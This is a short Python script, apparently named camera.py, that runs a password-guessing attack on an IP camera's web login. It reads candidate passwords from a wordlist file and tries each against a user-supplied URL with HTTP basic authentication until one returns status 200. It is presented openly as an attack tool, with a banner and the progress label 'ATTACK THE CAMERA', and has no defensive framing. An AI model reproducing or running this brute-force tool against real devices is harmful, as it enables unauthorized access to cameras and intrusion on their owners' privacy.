
import requests,threading,sys,time
from pwn import *
from tqdm import tqdm


def Banner():
                print("")
                print('''   █████████               █████                       ███████████                ██████████ █████                █████  ███  █████                    █████
  ███░░░░░███             ░░███                       ░░███░░░░░███              ░░███░░░░░█░░███                ░░███  ░░░  ░░███                    ░░███ 
 ███     ░░░   ██████   ███████   ██████  ████████     ░███    ░███ █████ ████    ░███  █ ░  ░███                 ░███  ████  ░███████    ██████    ███████ 
░███          ███░░███ ███░░███  ███░░███░░███░░███    ░██████████ ░░███ ░███     ░██████    ░███                 ░███ ░░███  ░███░░███  ░░░░░███  ███░░███ 
░███         ░███ ░███░███ ░███ ░███████  ░███ ░░░     ░███░░░░░███ ░███ ░███     ░███░░█    ░███                 ░███  ░███  ░███ ░███   ███████ ░███ ░███ 
░░███     ███░███ ░███░███ ░███ ░███░░░   ░███         ░███    ░███ ░███ ░███     ░███ ░   █ ░███      █    ███   ░███  ░███  ░███ ░███  ███░░███ ░███ ░███ 
 ░░█████████ ░░██████ ░░████████░░██████  █████        ███████████  ░░███████     ██████████ ███████████   ░░████████   █████ ████ █████░░████████░░████████
  ░░░░░░░░░   ░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░        ░░░░░░░░░░░    ░░░░░███    ░░░░░░░░░░ ░░░░░░░░░░░     ░░░░░░░░   ░░░░░ ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░░░ 
                                                                     ███ ░███                                                                               
                                                                    ░░██████                                                                                
                                                                     ░░░░░░                                                                                 ''')


Banner()

def main():
    print("")
    if len(sys.argv) != 3:
       print("\033[1;35mUsage python3 camera.py admin http://IP:Port")

       sys.exit()

    for v in tqdm(range(30), desc="\033[1;35mATTACK THE CAMERA"):
        time.sleep(0.1)

    print("")
    url = sys.argv[2]
    user = sys.argv[1]
    p1 = log.progress("Start Attack")
    time.sleep(2)
    passwords = open('PasswordCamera.txt','r')
    for password in passwords:
        password = password.strip()
        p1.status("\033[1;34mSearch Password : %s " % password)
        r = requests.get(url,auth=(user,password)).status_code
        if r == 200:
            p1.success("\033[1;32m Username : {1}   |   Password Is Found : {0}".format(password,user))
            break;

if __name__=='__main__':
        s = threading.Thread(target=main(),args=(1,))
        s.start()
